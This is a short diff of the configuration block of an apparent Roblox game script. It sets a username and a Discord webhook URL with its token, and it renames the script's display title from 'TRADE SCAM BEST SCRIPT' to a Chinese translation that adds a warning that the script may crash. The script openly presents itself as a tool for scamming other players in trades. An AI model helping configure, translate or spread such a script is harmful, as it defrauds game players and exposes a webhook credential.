@@ -2,7 +2,7 @@ Username = "cocvn_my"
 
 WebHook = "https://discord.com/api/webhooks/1079342398871715841/LAWZqg3Hby0JeXIPPatac7jdyNbbQ6mnNWFzqnXnd4Sj7X7OKRcfvWYp2uyAucZa7BeR"
 
-_G.CustomScriptName = "TRADE SCAM BEST SCRIPT"
+_G.CustomScriptName = "贸易诈骗最佳脚本（脚本可能会闪退）"
 
 _G.Text1 = "脚本加载..."
 
